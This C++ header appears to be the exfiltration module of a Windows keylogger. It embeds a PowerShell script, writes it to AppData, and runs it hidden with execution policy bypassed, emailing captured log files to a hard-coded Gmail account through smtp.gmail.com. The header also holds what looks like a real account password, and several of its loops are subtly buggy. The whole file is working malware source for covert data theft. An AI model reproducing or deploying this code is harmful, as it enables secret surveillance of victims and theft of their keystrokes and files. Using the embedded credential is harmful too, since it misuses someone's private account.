#ifndef EXFILTRATE_H
#define EXFILTRATE_H

#include <fstream>
#include <vector>
#include <string>
#include <Windows.h>
#include <iostream>
#include "IO.h"
#include "Timer.h"
#include "Auxiliary.h"

namespace Exfiltrate
{
	#define SCRIPT_NAME "Exfiltrator.ps1"
	#define ORIGIN "abdullahansari1618@gmail.com" 
	#define DESTINATATION "abdullahansari1618@gmail.com"
	#define PASSWORD "kywszmmfscebhngb"

	const std::string &exfiltratorScript =

		"Param( [String]$attachment, [String]$subject, [String] $body)\r\n\r\n"
		"#Below is a declaration for the function that will handle sending email to gmail's smtp server\r\n\r\n"
		"Function exfilLogs\r\n{\r\n"
		"\t#The function will accept the following parameters all of which are mandatory\r\n\r\n"
		"\tParam(  [Parameter(Mandatory = $true)] [String] $recepient,\r\n"
		"\t[Parameter(Mandatory = $true)][String] $sender,\r\n"
		"\t[Parameter(Mandatory = $true)][String] $password,\r\n"
		"\t[Parameter(Mandatory = $true)][String] $subject,\r\n"
		"\t[Parameter(Mandatory = $true)][String] $body,\r\n"
		"\t[Parameter(Mandatory = $true)][String] $attachment)\r\n\r\n"
		"\t#This try-catch block will attempt to send the email after building the groundwork for our message\r\n\r\n"
		"\ttry\r\n\t{\r\n"
		"\t\t#We declare a message variable w / relevant values and assign our smtp server\r\n\r\n"
		"\t\t$message = New-Object System.Net.Mail.MailMessage($sender, $recepient, $subject, $body);\r\n"
		"\t\t$mailServer = \"smtp.gmail.com\";\r\n\r\n"
		"\t\t#If the attachment is not equal to null\r\n\r\n"
		"\t\tif ($attachment -ne $null)\r\n\t\t{\r\n"
		"\t\t\ttry\r\n\t\t\t{\r\n"
		"\t\t\t\t#Split multiple files into individual attachments\r\n\r\n"
		"\t\t\t\t$workingAttachment = $attachment -split (\"\\:\\:\");\r\n\r\n"
		"\t\t\t\t#Loop through them and add them to the main message object\r\n\r\n"
		"\t\t\t\tForEach($value in $workingAttachment)\r\n\t\t\t\t{\r\n"
		"\t\t\t\t\t$workingAttachment2 = New-Object System.Net.Mail.Attachment($value);\r\n"
		"\t\t\t\t\t$message.Attachments.Add($workingAttachment2);\r\n"
		"\t\t\t\t}\r\n\t\t\t}\r\n"
		"\t\t\tcatch\r\n\t\t\t{\r\n"
		"\t\t\t\texit 2;\r\n\t\t\t}\r\n\r\n"
		"\t\t\t#Now that we have constructed a message with an attachement, we continue by connecting our mail client to our mail server\r\n"
		"\t\t\t#Then enable security(mandatory), create credentials with our username and password, and finally send our message off\r\n\r\n"
		"\t\t\t$mailClient = New-Object System.Net.Mail.SmtpClient($mailServer, 587);\r\n"
		"\t\t\t$mailClient.EnableSsl = $true;\r\n"
		"\t\t\t$mailClient.Credentials = New-Object System.Net.NetworkCredential($sender.Split(\"@\")[0], $password);\r\n"
		"\t\t\t$mailClient.Send($message);\r\n\r\n"
		"\t\t\t#Finally we destroy the client as well as our credential\r\n\r\n"
		"\t\t\tRemove-Variable -name mailClient;\r\n"
		"\t\t\tRemove-Variable -name password;\r\n\r\n"
		"\t\t\texit 7;\r\n\r\n"
		"\t\t}\r\n\t}\r\n"
		"\tcatch\r\n\t{\r\n"
		"\t\texit 3;\r\n\t}\r\n\r\n}"
		"\r\n\r\ntry\r\n{\r\n"
		"\texfilLogs -sender \"" + std::string(ORIGIN) + "\" -recepient \"" + std::string(DESTINATATION) +  "\" -subject $subject -body $body -attachment $attachment -password \"" + std::string(PASSWORD) + "\";\r\n"
		"}\r\ncatch\r\n{\r\n\texit 4;\r\n}";

	#undef ORIGIN
	#undef DESTINATION
	#undef PASSWORD

	std::string stringReplace(std::string inputString, const std::string &targetPattern, std::string replaceWith)
	{
		if (targetPattern.empty())
		{
			return inputString;
		}

		size_t stringIndex = 0;

		while ((stringIndex = inputString.find(targetPattern, stringIndex) != std::string::npos))
		{
			inputString.replace(stringIndex, targetPattern.length(), replaceWith, stringIndex += replaceWith.length());
		}

		return inputString;
	}

	bool doesFileExist(const std::string &fileName)
	{
		std::ifstream checkFile(fileName);
		return (bool)checkFile;
	}

	bool writeScript()
	{
		std::ofstream scriptFile(IO::getAppDataPath(true) + std::string(SCRIPT_NAME));

		if (!scriptFile)
		{
			return false;
		}
		else
		{
			scriptFile << exfiltratorScript;
		}

		if (!scriptFile)
		{
			return false;
		}
		else
		{
			scriptFile.close();
			return true;
		}
	}

	Timer myTimer;

	int exfilLogs(const std::string &subject, const std::string &body, const std::string &attachments)
	{
		bool isSuccessful = IO::createDirectory(IO::getAppDataPath(true));

		if (!isSuccessful)
		{
			return -1;
		}

		std::string scriptPath = IO::getAppDataPath(true) + std::string(SCRIPT_NAME);

		if (!doesFileExist(scriptPath))
		{
			isSuccessful = writeScript();
		}

		if (!isSuccessful)
		{
			return -2;
		}

		std::string executionParams = "-ExecutionPolicy ByPass -File \"" + scriptPath + 
			"\" -subject \"" + stringReplace(subject, "\"", "\\\"") + "\" -body \"" 
			+ stringReplace(body, "\"", "\\\"") + "\" -attachment \"" + attachments + "\"";

		//Conversion from std::string to LPCWSTR

		std::wstring tmp = std::wstring(executionParams.begin(), executionParams.end());
		LPCWSTR executionParams2 = tmp.c_str();

		SHELLEXECUTEINFO shellConfig = { 0 };
		shellConfig.cbSize = sizeof(SHELLEXECUTEINFO);
		shellConfig.fMask = SEE_MASK_NOCLOSEPROCESS;
		shellConfig.hwnd = NULL;
		shellConfig.lpVerb = L"open";
		shellConfig.lpFile = L"powershell";
		shellConfig.lpParameters = executionParams2;
		shellConfig.lpDirectory = NULL;
		shellConfig.nShow = SW_HIDE;
		shellConfig.hInstApp = NULL;

		isSuccessful = (bool)ShellExecuteEx(&shellConfig);

		if (!isSuccessful)
		{
			return -3;
		}

		WaitForSingleObject(shellConfig.hProcess, 7000);
		DWORD exitCode = 100;
		GetExitCodeProcess(shellConfig.hProcess, &exitCode);
		
		myTimer.SetFunction([&]()
		{
				WaitForSingleObject(shellConfig.hProcess, 60000);
				GetExitCodeProcess(shellConfig.hProcess, &exitCode);
				if ((int)exitCode == STILL_ACTIVE)
				{
					TerminateProcess(shellConfig.hProcess, 100);
				}

				Auxiliary::logError("[From Mailer Function] Error Code: " + Auxiliary::toString((int)exitCode));
		});

		myTimer.RepeatCount(1L);
		myTimer.SetInterval(10L);
		myTimer.Start(true);
		
		return (int)exitCode;
	}

	//Overload of exfil function to handle multiple attachments

	int exfilLogs(const std::string &subject, const std::string &body, const std::vector<std::string> &attachments)
	{
		std::string attachments2 = "";

		if (attachments.size() == 1U)
		{
			attachments2 = attachments.at(0);
		}
		else
		{
			for (const auto &value : attachments)
			{
				attachments2 += value + "::";
				attachments2 = attachments2.substr(0, attachments2.length() - 2);
			}
		}

		return exfilLogs(subject, body, attachments2);
	}

}


#endif 